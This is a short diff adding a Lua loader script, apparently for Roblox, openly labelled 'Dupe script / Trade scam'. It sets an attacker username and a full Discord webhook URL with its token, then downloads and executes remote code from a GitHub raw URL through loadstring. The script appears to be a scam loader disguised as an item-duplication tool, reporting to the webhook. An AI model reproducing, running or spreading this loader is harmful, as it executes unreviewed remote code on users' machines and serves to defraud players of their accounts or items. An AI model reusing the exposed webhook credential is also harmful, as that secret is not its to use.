@@ -1,0 +1,4 @@
+_G.Username = "grants_alt2" 
+_G.HubName = "Dupe script / Trade scam" 
+_G.Webhook = "https://discord.com/api/webhooks/1098639594590830632/clPtqdLnRJdOdLyrNBzOKwsVmc9t1de31oVj_j4Je9eSk6wzxCnq_u69pwmcErURMkhE" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
